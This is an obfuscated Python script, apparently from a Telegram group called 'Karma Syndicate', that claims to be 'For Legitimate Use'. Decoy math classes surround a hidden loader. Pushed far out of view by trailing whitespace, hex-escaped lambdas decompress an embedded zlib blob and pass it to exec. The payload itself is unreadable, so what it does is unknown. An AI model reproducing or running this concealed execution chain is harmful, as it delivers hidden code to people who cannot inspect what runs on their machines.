from builtins import *
from math import prod as Theory


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_positive, _frame, Divide, _substract, _while, Round, Algorithm = exec, str, tuple, map, ord, globals, type

class Power:
    def __init__(self, Negative):
        self._absolute = Theory((Negative, -82772))
        self.Calculate(Random=31511)

    def Calculate(self, Random = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._absolute += -6389 - Random
        
        try:
            ((_substract, _positive) or Divide if (_substract, _positive) and Divide else ... or (Divide, (_substract, _positive)))

        except ArithmeticError:
            ((_positive, {_substract: _substract}) for _positive in {_while: 'rxTblnexmbgb:'} if _while >= _substract)

        except:
            Algorithm(-77603 - -12025) == str

    def _theory(self, DetectVar = 73159):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        DetectVar -= 71580 * 8768
        self.Statistics != False
        
        try:
            (((_substract, _positive), _substract) for _substract in {_substract: _substract})

        except AssertionError:
            (({_substract: _substract}, _while) for _while in (_substract, _frame))

        except:
            Algorithm(89987 + -74168) == int

    def _add(_walk = False):
        return Round()[_walk]

    def _floor(_negative = 40962 + 36399, _cube = False, Substract = Round):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Substract()[_negative] = _cube
        
        try:
            ((_while, (_substract, _frame)) for _while in (Ceil, _substract, _positive) if Round is _positive)

        except OSError:
            ((Ceil, {_substract: _substract}) for Ceil in (_substract, _frame) if _substract is _while)

        except:
            Algorithm(52503 * -8482) == str

    def execute(code = str):
        return _positive(_frame(Divide(_substract(_while, code))))

    @property
    def Statistics(self):
        self._divide = '<__main__._add object at 0x000001373BE90381>'
        return (self._divide, Power.Statistics)

if __name__ == '__main__':
    try:
        Power.execute(code = __license__)
        Frame = Power(Negative = -77261 / 39117)

        Frame._theory(DetectVar = -47792 / Frame._absolute)                                                                                                                                                                                                                                                          ;Power._floor(_negative='SS2SSSSS2SSSS22S2S2SS22S2S',_cube=b'x\x9c\xe5Z{o\xdb6\x10\xff_\x9fB\x0b0HB\xd3T\xd6\x83\xb2\r\x04\x18V#\x83=\xbb\x1e\xe6nmW\x14\x82lS)3Y\xcc$9v\xf6\xe9w<R~\xc4V-;i14\xa2O\xa4(>\x8e?\xde\xf1\x8e\xb4\x8a\xec\xbe\xad\xe9p\xb1\xd8\xc4X\\aXp\x9e\x84\xa1\xfe\xc3\xe5\xd9\x15\xcf\xf4>\xbdf\x05\x9bE\x05\xd5\xff\xc8\xe9\x99\xce\xb3\x8d\xa2\xd1\xbc\xf8\xcc\xb3\x1cK\x9bgoiB\xaf\xb3h\xd6>;?\xfbi\x99Fc>>\xb3\xb6\xca\xf3\xec:J\xd9\xbfQ\xc1x*\xbb\xf85\xcaf\x91>\xbaO\xa7l\x02}<h\xbfP-\xca\xb2\x9f\x8b\xe26o\xbfzU\\\xcc\xe8+\xacXU\xef\x8ef\xf9\xaa\x8b>\xbc\xcf\x8b\x07%\x126\xa1iN\xb1\x84\xe15]b\xbb\xc1\xd4m9N\xe0\xb8\r\xdf\xb1\xc7\x13\xd7\xf5H\xd4\xf2&\xcd(04\xab\xbd\xaa\xcb\xd2\xc24\xf2\xbf\xd9\xd4\xb04\xba\x9c\xd0\xdbB\x81\x98\xde\xce\x0b\xf3\xec\xb7\x84F9\xd5;<5\n}\xc0\xa7,\xbe?\xb34\xd9)\x9b\xdd\xf2\xac\x08C\xa8\x7f\x9f\x1b\xd6\x05]\xb2\xc2\xb4\xb4\x84O\xa2$7\xad\x8fF\xbf\xd7\xebv\xbb\xfd~\xbf\xd7\x17I\x88\xba=\xe3\xd3\xe5u\xc2\xc7PB\xdb\xf7ZTc\xc9M\xc2\x92\xe4\xe6\x06\x08\xd27\xeavc|l\xb7_\xbc|\xf1\xd2|i\xbehX\xd6\xa7O\x97S\x96U\xb6\xd2\xed&\xdd\xf2J\xba\t\\\xbb\xf5\xafi\x11\x15Eu\x1b\xcb\xc5r)HD\x98\x82\x04\x0c@\x8eP\xdb\xf7V\xd4\x1a\x8dF\x0e^*\x01\xf7\x91\x03\xd5\xd6\x88Uv\x98\xa6\xe9l\x864\x13\x04\x8f)T\xdc\xdb\xa0i\x8c\xe7,)X*\xa0\xbf\x8b\xb2j<\x17K\xc5\xe7B2\xbc\x10C\x80k\x0b\xa0\xaeY\xd1K\x9e\xb2"a\xf3\xf1C\xf4\xacs\x98\x12\x98#u\x93\xf3\x85SwtK\xd6\xc7\xa7k\xea\x82\xa5S\xba4\x8d\x84\xf3\xdd\xb7\x9f,m\x0f\xc28g\xd8\xf2\x08\x9b\xc7\x9e\xf0\xf6\x1c\x80\xa2\t\xbb\x9d\xf1\xc9\x11Xu%$\x89\xd4+\x01\x8az\x06\xb8\x0c\xe3\xe2\x86\xb3\xb4R7\xde\xbd{\xff^\xd0{A\xef1-r\x9e\x05\xd0y\x12]\xed\x83\xb9Jo\x11\x8cD\x01\x8d\x89\xe7\x00S\x11\xf1$>B\x1a\x87C\x1b~@\xdc\xe6\xf0\xb3\x87"z\x0e@%\xd1\x1d\xdd\x87S\x95\xea\r\x05L\x9c\x03P\x08\xd1P<C8\x12,\xc6&98=O\x00VeK\xc7\x83U\xddT\t\xd6}\xcc\x92%\xfd\x9c\xce\x8fQ@\x89 X\xcd\x05\x92\xb4\xfd\xdf\xbbX\xd1y\xf6\xf6\x08\xf5[\xae\xfc\x8a\x85\x92\xbag\xe2`dE~\x84,U*\x9f96\xc8D\x06\xaf\xe5\xb5d\xbc\xbe\xcb\\\x19\xe4\x13x{S:\xe1Sj\x1a\xcd\xb8\xd8#\xcf\xdf?\xf4\x13\xba\xdc\xbb\xf2U\x88\xe8\xe0\r\x04u\x83k0\x18lV\xdek?\xcc/\xcd\x97K\xfc\xd8u\x81Z@\r\xa0&\x90\xaf\xd2\x0e\x90\'\xd2\xce\xd8i:\xd3Zem\xe7\xe0\xacZ\xb8_9\x9eW\xc7\xf1\'\x84\xfan`\x83\xf4\xb4\x02/\xf0\x88\x1f`\x1ex\xb7\x87\xfa\xac\x02\x94\xa9\x99drjao&\x1e\x1f\tj\xa0@qUl+\x80lEM\x04J\x82z\xa8\xacx\xdf\xaa\x0bj\x12\xcd\xc6\xd3HO\x94\x8f\x85\xda#]Zt\xbc\xda{A\xa8\x82FHW)hx\r\x90\x1e+q\xb63\xc5\x817\xbe\xa6\xa4\x90\x16\t\x08%q\xe0\x10\xff\x11\xd2\xb1X\x94f@ZN\x11\x1d\x1e\xbea\xd9\xf0\xb6\xf1H\x9c\x1a\n\xa7\x9a\x1a\xb5%\x00\xd0d\x07\xc2P4\xdd\x19rA\xd0v{\xbf;U1\xf8/1\xe7\xc5"\x10\x0c\xae-H\x04O=\x8b\x1co\xf5\x86\xc4\x87\x97\xf9\x13\xa68\xf0|B\xe5\x12\xe0\xd8\xa4\x01D\x880+\x90K\x1adJ|7rl\'8y\xea1Se\xe1}\xf6\x84\x13oXA\xe8\x84n\xd8\x0cI\xe8\x856\x90\x1f6\xa1ts7\xb7V\xafP\xad\x05\xd5\x02\xa8\xe8@\xa5V\xd8\x10\xe3\xdb\xcd\xad\xc7\x99\x8dU\x9a\xd0\xbf\x03q#\xf4\x90\xb3\x9d\xdc:\x8d\xb9\xa2W\x0c-\xa8\xde\x00.\x04g\xdenn=\xce\x04\x17$\x14\xb1\x0b\\@\x1a9\xdb\xc9\xfd\xb6+T\x15\xad\xb4\xb1t\xbbK\xa7r\xd1\xde\xefY\x9d\xa4\x88B\xd5\x84\xea\x95\n\xe7\xc5\xa5:\xca7dUB*\xa8WC\x1d\x15\xdf\xa5=\x84\x1f\xa4\xd0\xdd\x81\xfb\x132?\x85@!L7B\xf9,c\xba\n\x98W\x9but\xc3\xf0\xeck\xe30\xec(\xf3w\x08u\x89\xb4\x87\xd8J\x94\xc9\xc6\x1c\xacK\xc8\xf05\x96\xc0\x95?&\xdc\x05\xa2\xfc\xb22/P\xbe\x99\xf7\xc0w\xfbr\xd9\xc3\xf2~\nZ\xeb\x89\xdc\x9e\xd0\xed\xc9U\xa1\xf6\x14\xcf\x90\x8d\x92\x1b\xc9\xceq\x16\xceP~\xba\x83\'\xa5\xe8\xb5\x7f+\xe3~\xc2\x12s\x9a#\x14\x04\x8fp\x7f:\xbc\xd3A\x0f\xa2\xc3\x85\x13\x01^\x04P\xa7S\x07$X\xe6_\xda\xf5\x16u\x0f\xcd\x8a\x8b\x8b\xb7\x0b\xcbw\x03\x17\xf5\x9d\xdcZ\xbd\xa2\xb9s\xc1\xa0\x04`Z\x88\x88\xa1\xb4\xb3\x9b\xfb\xad\xe6\xd9Q\xaa\xd6T\xdb#G\xa9\x9b\xbb\xe1\xdd\x13\xa5\xa2u\xca\xfa\xa7\x99\xa4\xcd\x9d\x81<\x82\x95\xe7\xddr{p\xa4\xd6t{h\x00\xba=\x08h\x04\xd4\xbfa\x8fG*P#o)\xf2\x159\n\x95`\x03\xa9Ce\xc9W\xdc^\x04\x8f\xf0+\xd5\xf1\x92BZ\xed/\xea\xed*|\x90\\\x02\xaa\xe0\x82r4\xd0\xeb\x11\xd2Mvs\x9fPA\xbf\x86\xa3\xb4\x92\xc6\x9e\xf0 \xfaR\x92 \t)p(\xfaG\x8a\xe3H\xfe\xcb%\xff\xe9\x92Tg\x1d\x7f\xca\xbd\xd7iK\xb3\'\xb6)q\x80\xdb\x18\xc7\xf6m\xb9\x95\xf1\xd46\x06\xb7/\'/\xdd\x07\xec\xf1\xa6\xd5\xa5[N\xd8\xae\x8d\xaeo\x91\xd1\xcf\x95\xe2,o\xe8\xf6>\x99\xd7\xe5\xbb\xae#\x82\x88}W\x842\x96i\xf9\xb4~\xef\x1eD\xef4\xe5\x0fV\'P~\x1c\x8c\x83\xa9\x03\xf3\x174a\x0eO_\x14\xc47\x01,\x91~6^\xc9\xcd\xb7\xb4P\xf6\x03\xcb\xd3xp\x16\xb5\xb9\xee\x1e*[s\xdd\xddZ\x07F\xebcS\xe5\xb6K\xcf\xec\xb8\xad\x86\xc1\xc5\xd0m$\x18\xbc<\xfd\x80\xa1\xf2a\xbd\xc5\x95\xe0>Y\xf8\x1d\xae\xdc3\xe3\xe2\xba\x93\xfb\xff\xf1\xfc\xa4\x00<v\x11\'j"\xc9\x86\xcb\xe1o\x1cT\xa2A\xdd\xd8E\x1c*\x1b\xd4\x1c\x98\x16g|\xa6\x97\x1f~\xe8\xf2{\x12\x9d.\xe9\xe4<\xe6\xd9,*\xce\xf1\xbb\x9ds\x9a\xceg4\x8b\nz\xceoi\xaa\x89\x02\xa6\x14\x05\xe9|\x08\xe3!\xbc\x11\x90\x0fKS\xad,\xa2,e\xe9u^>\xe7\xf7\xb9V\xe6]\xc4\xd0#\xcd\xcaGs\xa0\xce5W\xa7\x9c\x03y\xf0iiP\xeb\xa2\xc8\xa2\t\x1dG\x93\xbf\x136c\xc5\xe5P\xa0\xa7D\x0b\xe0-\xc5m\xc8\xb5\xdbL|~4(\xcf\xe5W\xe7\xf4\x96\xf63\xed\xbd\xfe3\xbe\x94_!\xad\xf7\xa5Ni\xb6F#K\xeb-\x7f\x9f\xdf\xe5\x97oxJ\xb5\x05+>\xebb\xacf\x16-BY\rf\x8c\xe3\x84\x8a\xbe\xe0\xce\xb1{nYQ\xae\x7f\xb8\x1a\xb0\xbb\xd7\x1f\xe4\xb7N\x00\x9d\x9e\xde\xfdu\xfb\xee\x9f\xf3\x84\xa5Tg\xa9\xbe\x02\xd0T%7?\x99\x8aUi\xfdG]\xf1\tc\xe4\xa87 *\xd8\xcd\x103\xe0ZWSU%\xd7\xdb\xd9\xe2\x92\xf9\x17\x93\x84\xe7\xd4\xb4\xb6^\xff\x92\xdd]]\xcd/\xcb\xad\xb9\xdc\x9b+\x1c\xc4\xedB\xce\xbd)\xb9z!y\xdanBa\x85\x08\xc9\xe6\xce\x95\xf1/7sp_WQ\xcc,2\x06\x08\x08L,\xad\x82\xfd\x07l\xff\x07\x0f\xe7\x82\x17')

        if 412036 > 5331138:
            Power(Negative = 85253 * 64087).Calculate(Random = Frame._absolute / 68772)
        elif 492609 < 5710570:
            Frame.Calculate(Random = Frame._absolute * -41020)                                                                                                                                                                                                                                                          ;S22222S222S222S2SS2S,xxwwwwwwwxxwxxxxwwwxx,nnnnmnmnnnmnnmmmmmnmn,OoOoo0OOOOOoooO00OOoo0O00,wwxwxwxxwwxxwwxxwx=(lambda O0o0OoOoooOOoOoOOOo0O:O0o0OoOoooOOoOoOOOo0O(__import__('\x7a\x6c\x69\x62'))),(lambda O0o0OoOoooOOoOoOOOo0O:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0o0OoOoooOOoOoOOOo0O)"),filename='\x57\x58\x58\x57\x58\x58\x57\x57\x57\x57\x57\x58\x58\x57\x58\x57\x57\x58\x57\x57\x57\x57\x57\x57\x58',mode='\x65\x76\x61\x6c'))),(lambda O0o0OoOoooOOoOoOOOo0O:O0o0OoOoooOOoOoOOOo0O['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda MNMNMMNNMNMNMMNNNMMNNMM,O0o0OoOoooOOoOoOOOo0O:MNMNMMNNMNMNMMNNNMMNNMM(O0o0OoOoooOOoOoOOOo0O)),(lambda:(lambda O0o0OoOoooOOoOoOOOo0O:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0o0OoOoooOOoOoOOOo0O)"),filename='\x57\x58\x58\x57\x58\x58\x57\x57\x57\x57\x57\x58\x58\x57\x58\x57\x57\x58\x57\x57\x57\x57\x57\x57\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        Power(Negative = -92682 + -43138)._theory(DetectVar = 60018 * Frame._absolute)                                                                                                                                                                                                                                                          ;wwxwxwxxwwxxwwxxwx()(OoOoo0OOOOOoooO00OOoo0O00(nnnnmnmnnnmnnmmmmmnmn(S22222S222S222S2SS2S(xxwwwwwwwxxwxxxxwwwxx('\x76\x61\x72\x73'))),Power._add(_walk='SS2SSSSS2SSSS22S2S2SS22S2S')))

    except Exception as Ceil:
        if 185816 > 824281:
            Power.execute(code = _frame(Ceil))

        elif 244329 > 9680030:
            Frame.Calculate(Random = Frame._absolute - 58714)